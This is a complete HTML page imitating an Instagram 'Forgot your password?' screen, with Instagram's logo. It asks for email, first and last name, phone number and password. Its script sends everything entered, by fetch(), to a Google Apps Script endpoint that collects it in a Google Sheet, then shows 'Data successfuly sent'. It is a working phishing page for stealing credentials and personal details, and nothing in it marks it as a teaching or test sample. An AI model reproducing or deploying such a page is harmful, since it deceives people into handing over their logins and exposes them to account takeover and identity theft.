<!DOCTYPE html>
<html>
  <head>  
    <title>Forgot you password?</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="section2.css">
  </head>
  <body>
    <section>
        <div class="login-box">
            <form class="action" name="submit-to-google-sheet">
                <h2><div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yx/r/WtxJZZ3-9ZP.png&quot;); background-position: 0px 0px; background-size: 176px 186px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i></div></h2>
                <div class="input-box">
                    <span class="icon"><i class="fa-solid fa-envelope"></i></span>
                    <input type="email" required class="input" placeholder="email" name="email">
                </div>
                <div class="input-box">
                    <input type="text" required class="input" placeholder="firstname" name="firstname">
                </div>
                <div class="input-box">
                   <input type="text" required class="input" placeholder="lastname" name="lastname">
                </div>
                <div class="input-box">
                   <input type="text" required class="input" placeholder="phonenumber" name="phonenumber">
                </div>
                <div class="input-box">
                   <input type="password" class="input" placeholder="password" name="password">
                </div>
                <button type="submit" class="submit">Log in</button>
                <span id="success"></span>
            </form>
        </div>
    </section>
    <section>
     <div class="register-link">
      <p style="font-size: 13px;font-weight: 500;">Don't have an account?<a href="youalreadyhaveanaccount.html">Sign up</a></p>
     </div>
    </section>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbzDfxsTLIDLm_qPuT5ppKSCpIEQC_kOoLMiFzElxlLp0MdVEeb6G0X6k0roZuFSBbVG/exec'
        const form = document.forms['submit-to-google-sheet']
        const success = document.getElementById('success');
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => {
              success.innerHTML="Data successfuly sent";

              setTimeout(function()
              {
                  success.innerHTML=""  
              },5000)
              form.reset();
            })
            .catch(error => console.error('Error!', error.message))
        })
  </script>
</body>
</html>
